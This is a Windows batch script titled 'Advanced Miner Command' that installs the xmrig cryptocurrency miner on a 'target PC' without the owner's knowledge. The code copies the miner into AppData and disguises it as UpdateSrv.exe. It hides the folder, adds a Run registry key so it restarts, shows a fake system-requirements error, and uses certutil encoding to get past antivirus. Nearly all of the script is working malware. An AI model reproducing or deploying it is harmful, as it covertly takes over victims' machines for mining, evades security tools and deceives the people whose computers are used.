@echo off
CD /d "%~dp0"
REM ============================================================================
REM                        Advanced Miner Command
REM                                 -REDD-
REM                    https://www.private-locker.com
REM                        (See below for MIT Lic.)
REM ============================================================================
REM ---------------------------[ FEATURES/TOGGLES ]-----------------------------
REM ============================================================================
REM 
REM AUTOSTART    - CREATES A REGISTRY ENTRY TO START A GENERATED BATCH
REM                FILE IN THE TARGET PC'S FOLDER.
REM BACKGROUND   - RUNS THE MINER IN THE BACKGROUND WITHOUT DISPLAYING
REM                ANY PROMPT ON THE SCREEN.
REM ENCRYPTION   - USES A NATIVE TOOL IN WINDOWS TO ENCRYPT THE EXE OF
REM                THE MINER, TRANSFER TO TARGET PC, DECRYPT. BYPASSES
REM                60% OF ANTIVIRUSES.
REM FAKEAPP      - RUNS THE ORIGINAL MINER AS A DIFFERENT EXE NAME.
REM                (DOES NOT RENAME THE APP INSIDE THE MANIFEST aka -
REM                 APPEARS THE SAME ON TASK MANAGER.)
REM FAKEERROR    - OPENS A FAKE ERROR MESSAGE BOX WITH YOUR CUSTOM 
REM                STRING OF TEXT USING "ERRORTXT".
REM HIDELOCATION - HIDES THE DIRECTORY OF THE MINER FOLDER ON TARGET
REM                PC WHEN RAN.
REM MINEREXTRAS  - PULLS THE EXTRA DLL FILES WITH THE MINER. ONLY USE
REM                IF THE MINER REQUIRES EXTRA DLL'S. 
REM MUTLIPOOL    - CHOOSE BETWEEN MULTIPLE POOLS (1,2,3,4,5) USING THE
REM                "POOLNUM" VARIABLE. (DEFAULTS TO POOL #1)
REM 
REM ============================================================================
REM
REM ============================================================================
REM ERRORS:
REM ============================================================================
REM Error 1     - Missing Original Miner for encryption/decryption.
REM               Check "ORIGMINER" filename in the folder this script
REM               is located inside.
REM ============================================================================
REM TOGGLES FOR EASE OF MANIPULATION OF SCRIPT. 
REM ============================================================================
SET "BACKGROUND=NO"
SET "ENCRYPTION=NO"
SET "FAKEAPP=NO"
SET "FAKEERROR=NO"
SET "HIDELOCATION=NO"
SET "MINEREXTRAS=NO"
SET "AUTOSTART=NO"
REM ============================================================================
REM MULTI-POOL CHOICE: (IF "NO" DEFAULTS TO POOL #1)
REM ============================================================================
SET "MULTIPOOL=NO"
SET "POOLNUM=2"
REM ============================================================================
REM MINER CREDENTIALS:
REM ============================================================================
REM POOL #1 (DEFAULT POOL)
REM ============================================================================
SET "SERVER1=POOL_1_URL"
SET "PORT1=PORT_NUMBER_HERE"
SET "USER1=WALLET_ADDRESS_HERE"
SET "PASS1=x"
SET "ALGO1=ALGO_HERE"
REM ============================================================================
REM ----------[ ONLY EDIT POOL #2-#5 IF YOU HAVE MULTIPOOL AS "YES" ]-----------
REM ============================================================================
REM POOL #2
REM ============================================================================
SET "SERVER2=POOL_2_URL"
SET "PORT2=PORT_NUMBER_HERE"
SET "USER2=WALLET_ADDRESS_HERE"
SET "PASS2=x"
SET "ALGO2=ALGO_HERE"
REM ============================================================================
REM POOL #3
REM ============================================================================
SET "SERVER3=POOL_SERVER_ADDRESS_HERE"
SET "PORT3=PORT_NUMBER_HERE"
SET "USER3=WALLET_ADDRESS_HERE"
SET "PASS3=x"
SET "ALGO3=ALGO_HERE"
REM ============================================================================
REM POOL #4
REM ============================================================================
SET "SERVER4=POOL_SERVER_ADDRESS_HERE"
SET "PORT4=PORT_NUMBER_HERE"
SET "USER4=WALLET_ADDRESS_HERE"
SET "PASS4=x"
SET "ALGO4=ALGO_HERE"
REM ============================================================================
REM POOL #5
REM ============================================================================
SET "SERVER5=POOL_SERVER_ADDRESS_HERE"
SET "PORT5=PORT_NUMBER_HERE"
SET "USER5=WALLET_ADDRESS_HERE"
SET "PASS5=x"
SET "ALGO5=ALGO_HERE"
REM ============================================================================
REM Basic MIT License:
REM
REM Copyright (c) 2018 Private-Locker, -REDD- & Private-Locker Community Entity
REM
REM THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
REM IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
REM FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
REM AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
REM LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
REM OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
REM SOFTWARE. 
REM 
REM =============================================================================
SET "ORIGMINER=xmrig.exe"
SET "MINEREXTRAFILES=msvcr110.dll"
SET "ENCRYPTED=inital.cert"
SET "DECRYPTED=%MINER%"
SET "AUTONAME=Miner Restart"
SET "AUTOFILE1=autostart.reg"
SET "AUTOFILE2=autostart.bat"
SET "FAKENAME=UpdateSrv.exe"
SET "SFLAG=-o"
SET "PFLAG=-p"
SET "UFLAG=-u"
SET "PASSFLAG=-p"
SET "CUSTOMFLAGS=--av=0 --donate-level=1 --cpu-priority=0"
SET "ENCRYPT=certutil -encode"
SET "DECRYPT=certutil -decode"
SET "TARGETDIR=%APPDATA%\TEST"
SET "TARGETDIRNAME=TEST"
SET "ORIGDIR=%~dp0"
SET "HIDE=attrib +s +h"
SET "UNHIDE=attrib -s -h"
SET "ERRORTXT=Your System Specifications does not meet the necessary Requirements."
REM Helper Variables for the script.
SET "MINER=NULL"
IF "%AUTOSTART%" EQU "YES" (SET "AUTOSTART=1") ELSE (SET "AUTOSTART=0")
IF "%ENCRYPTION%" EQU "YES" (SET "ENCRYPTION=1") ELSE (SET "ENCRYPTION=0")
IF "%BACKGROUND%" EQU "YES" (SET "BACKGROUND=1") ELSE (SET "BACKGROUND=0")
IF "%HIDELOCATION%" EQU "YES" (SET "HIDELOCATION=1") ELSE (SET "HIDELOCATION=0")
IF "%MINEREXTRAS%" EQU "YES" (SET "MINEREXTRAS=1") ELSE (SET "MINEREXTRAS=0")
IF "%FAKEAPP%" EQU "YES" (SET "FAKEAPP=1") ELSE (SET "FAKEAPP=0")
IF "%CLEANUP%" EQU "YES" (SET "CLEANUP=1") ELSE (SET "CLEANUP=0")
IF "%FAKEERROR%" EQU "YES" (SET "FAKEERROR=1") ELSE (SET "FAKEERROR=0")
REM Detect which name to use for the Miners Application Name..
IF "%FAKEAPP%" EQU "1" (SET "MINER=%FAKENAME%") ELSE (SET "MINER=%ORIGMINER%")
REM Start of Multiple Pool Helper by numbers 1-5, IF not enabled - use pool 1
IF "%MULTIPOOL%" EQU "YES" (
	IF "%POOLNUM%" EQU "1" (
		SET "SERVER=%SERVER1%"
		SET "PORT=%PORT1%"
		SET "USER=%USER1%"
		SET "PASS=%PASS1%"
		SET "ALGO=%ALGO1%"
	)
	IF "%POOLNUM%" EQU "2" (
		SET "SERVER=%SERVER2%"
		SET "PORT=%PORT2%"
		SET "USER=%USER2%"
		SET "PASS=%PASS2%"
		SET "ALGO=%ALGO2%"
	)
	IF "%POOLNUM%" EQU "3" (
		SET "SERVER=%SERVER3%"
		SET "PORT=%PORT3%"
		SET "USER=%USER3%"
		SET "PASS=%PASS3%"
		SET "ALGO=%ALGO3%"
	)
	IF "%POOLNUM%" EQU "4" (
		SET "SERVER=%SERVER4%"
		SET "PORT=%PORT4%"
		SET "USER=%USER4%"
		SET "PASS=%PASS4%"
		SET "ALGO=%ALGO4%"
	)
	IF "%POOLNUM%" EQU "5" (
		SET "SERVER=%SERVER5%"
		SET "PORT=%PORT5%"
		SET "USER=%USER5%"
		SET "PASS=%PASS5%"
		SET "ALGO=%ALGO5%"
	)
) ELSE (
	SET "SERVER=%SERVER1%"
	SET "PORT=%PORT1%"
	SET "USER=%USER1%"
	SET "PASS=%PASS1%"
	SET "ALGO=%ALGO1%"
)

REM Finally after all that craziness.. Time for THIS craziness..
IF EXIST "%TARGETDIR%\%MINER%" (GOTO 0) ELSE (GOTO 1)
:0
tasklist /FI "IMAGENAME eq %MINER%" 2>NUL | find /I /N "%MINER%">NUL
IF "%ERRORLEVEL%"=="0" (GOTO END) ELSE (GOTO START)
:1

IF EXIST "%TARGETDIR%\%ENCRYPTED%" (GOTO DEC) ELSE (GOTO PULL)
:PULL
IF EXIST "%ORIGDIR%\%DECRYPTED%" (GOTO ENC) ELSE (echo ERROR 1 && GOTO END)
:DEC
IF "%ENCRYPTION%" EQU "1" (
	CD "%TARGETDIR%"
	%DECRYPT% %ENCRYPTED% %MINER% && DEL /f "%TARGETDIR%\%ENCRYPTED%" >NUL
	GOTO START
	) ELSE (
	GOTO START
)
:ENC

IF "%ENCRYPTION%" EQU "1" (
	CD "%ORIGDIR%"
	IF NOT EXIST "%TARGETDIR%\%ENCRYPTED%" %ENCRYPT% %MINER% %ENCRYPTED% >NUL
	IF NOT EXIST "%TARGETDIR%" md "%TARGETDIR%" >NUL
	IF NOT EXIST "%TARGETDIR%\%ENCRYPTED%" COPY %ENCRYPTED% "%TARGETDIR%" && IF "%MINEREXTRAS%" EQU "1" COPY "%MINEREXTRAFILES%" "%TARGETDIR%" >NUL
	CD "%TARGETDIR%"
	GOTO DEC
	) ELSE (
	CD "%ORIGDIR%"
	IF NOT EXIST "%TARGETDIR%" md "%TARGETDIR%" >NUL
	IF "%FAKEAPP%" EQU "1" COPY %ORIGMINER% %MINER% >NUL
	IF NOT EXIST "%TARGETDIR%\%MINER%" COPY %MINER% "%TARGETDIR%" && IF "%MINEREXTRAS%" EQU "1" COPY "%MINEREXTRAFILES%" "%TARGETDIR%" >NUL
	IF "%FAKEAPP%" EQU "1" DEL /f "%MINER%" >NUL
	GOTO START
)
:START
CD %TARGETDIR%
IF "%AUTOSTART%" EQU "1" (
@echo Windows Registry Editor Version 5.00>%AUTOFILE1%
@echo. >>%AUTOFILE1%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]>>%AUTOFILE1%
@echo. >>%AUTOFILE1%
@echo "%AUTONAME%"="%SystemDrive%\\Users\\%username%\\Roaming\\Local\\%TARGETDIRNAME%\\%AUTOFILE2%">>%AUTOFILE1%
@echo. >>%AUTOFILE1%
IF "%BACKGROUND%" EQU "1" echo %MINER% %SFLAG% %SERVER% %UFLAG% %USER% %PFLAG% %PORT% %PASSFLAG% %PASS% %CUSTOMFLAGS% --background >%AUTOFILE2%
IF "%BACKGROUND%" EQU "0" echo %MINER% %SFLAG% %SERVER% %UFLAG% %USER% %PFLAG% %PORT% %PASSFLAG% %PASS% %CUSTOMFLAGS% >%AUTOFILE2%
reg import %AUTOFILE1% >NUL
IF NOT EXIST "%TARGETDIR%\%AUTOFILE2%" COPY %AUTOFILE2% "%TARGETDIR%" >NUL
DEL /f %AUTOFILE1%
)
IF "%CLEANUP%" EQU "1" (
	del /f "%TARGETDIR%\%ENCRYPTED%" >NUL
	del /f "%TARGETDIR%\%ENCRYPTED%" >NUL
)
IF "%HIDELOCATION%" EQU "1" (
	%HIDE% "%TARGETDIR%" >NUL
	) ELSE (
	%UNHIDE% "%TARGETDIR%" >NUL
)
IF "%FAKEERROR%" EQU "1" (
	echo Set objArgs = WScript.Arguments >1.vbs
	echo messageText = objArgs^(0^) >>1.vbs
	echo MsgBox messageText >>1.vbs
	cscript 1.vbs "%ERRORTXT%" >NUL
	del /f 1.vbs >NUL
)
IF "%BACKGROUND%" EQU "1" (
	CD %TARGETDIR%
	%MINER% %SFLAG% %SERVER% %UFLAG% %USER% %PFLAG% %PORT% %PASSFLAG% %PASS% %CUSTOMFLAGS% --background
	) ELSE (
	CD %TARGETDIR%
	%MINER% %SFLAG% %SERVER% %UFLAG% %USER% %PFLAG% %PORT% %PASSFLAG% %PASS% %CUSTOMFLAGS%
)
GOTO END

:END
PAUSE
EXIT /B
:EOF
